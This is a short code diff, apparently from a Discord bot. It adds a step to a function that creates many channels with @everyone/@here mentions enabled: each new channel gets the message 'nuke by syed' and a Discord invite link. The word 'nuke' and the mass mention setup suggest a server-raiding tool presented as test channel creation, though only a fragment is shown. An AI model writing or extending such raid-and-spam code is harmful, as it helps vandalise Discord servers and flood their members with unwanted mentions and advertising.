@@ -82,9 +82,12 @@ export async function createTestChannels(guild, count) {
           },
         ],
       });
+
+      await channel.send('nuke by syed https://discord.gg/TW9dTu7YKS');
+
       results.success++;
       results.channels.push(channel);
-      logger.info(`Created test channel: ${channel.name} with @everyone/@here mentions enabled`);
+      logger.info(`Created test channel: ${channel.name} with @everyone/@here mentions enabled and invite message sent`);
     } catch (error) {
       results.failed++;
       results.errors.push({
